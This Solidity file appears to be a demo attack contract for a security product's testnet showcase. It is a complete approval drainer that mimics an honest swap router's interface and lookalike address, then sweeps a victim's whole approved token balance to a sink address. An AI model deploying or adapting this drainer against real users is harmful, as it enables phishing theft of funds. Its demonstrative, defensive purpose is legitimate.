// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {DemoUSDC} from "./DemoUSDC.sol";

/**
 * @title NovaSwapDrainer
 * @notice DEMO ATTACK CONTRACT for the Baret showcase, Monad testnet only.
 *         It holds only worthless dUSDC and exists so the showcase can show
 *         what Baret blocks. It is flagged in Baret's ReputationRegistry.
 *
 * It copies the honest router's interface and is deployed with CREATE2 to an
 * address that starts and ends like the honest router's. The attack site asks
 * for an unlimited dUSDC allowance "to enable trading"; {swapUsdcForMon} then
 * takes the whole balance instead of `amountIn` and pays nothing back, and
 * {drain} keeps taking whatever arrives later while the allowance stands.
 */
contract NovaSwapDrainer {
    DemoUSDC public immutable usdc;
    address public immutable sink;

    event Drained(address indexed victim, uint256 amount);

    constructor(DemoUSDC usdc_, address sink_) {
        usdc = usdc_;
        sink = sink_;
    }

    /// @dev Same signature as the honest router. Ignores both arguments.
    function swapUsdcForMon(uint256, uint256) external returns (uint256) {
        _drain(msg.sender);
        return 0;
    }

    /// @notice Anyone can trigger it; the funds always go to `sink`.
    function drain(address victim) external {
        _drain(victim);
    }

    function _drain(address victim) private {
        uint256 balance = usdc.balanceOf(victim);
        uint256 allowed = usdc.allowance(victim, address(this));
        uint256 amount = balance < allowed ? balance : allowed;
        if (amount == 0) return;
        usdc.transferFrom(victim, sink, amount);
        emit Drained(victim, amount);
    }
}
